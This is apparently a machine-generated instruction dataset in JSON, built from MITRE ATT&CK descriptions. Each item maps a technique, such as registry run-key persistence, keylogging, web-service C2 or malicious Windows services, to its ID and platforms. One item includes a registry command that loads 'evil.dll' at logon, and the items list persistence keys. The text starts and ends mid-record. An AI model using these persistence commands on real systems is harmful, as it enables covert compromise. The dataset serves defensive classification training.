HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Discovery: Email Account (T1087.003);\nTechnique Account Discovery: Email Account (T1087.003) is applicable to platforms: Office 365,  Windows, Google Workspace;\nTherefore, the given procedure description is related to platforms: Office 365,  Windows, Google Workspace.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
      "answer": "The provided description is related to MITRE technique Account Discovery: Email Account (T1087.003);\nTechnique Account Discovery: Email Account (T1087.003) is applicable to platforms: Office 365,  Windows, Google Workspace;\nTherefore, the given procedure description is related to platforms: Office 365,  Windows, Google Workspace.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
      "answer": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote Services: Remote Desktop Protocol (T1021.001);\nTechnique Remote Services: Remote Desktop Protocol (T1021.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
      "answer": "The provided description is related to MITRE technique Remote Services: Remote Desktop Protocol (T1021.001);\nTechnique Remote Services: Remote Desktop Protocol (T1021.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "answer": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
    "context": "",
    "output": "The provided description is related to MITRE technique Drive-by Compromise (T1189);\nTechnique Drive-by Compromise (T1189) is applicable to platforms: SaaS,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: SaaS,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
      "answer": "The provided description is related to MITRE technique Drive-by Compromise (T1189);\nTechnique Drive-by Compromise (T1189) is applicable to platforms: SaaS,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: SaaS,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Create or Modify System Process: Windows Service (T1543.003);\nTechnique Create or Modify System Process: Windows Service (T1543.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.",
      "answer": "The provided description is related to MITRE technique Create or Modify System Process: Windows Service (T1543.003);\nTechnique Create or Modify System Process: Windows Service (T1543.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
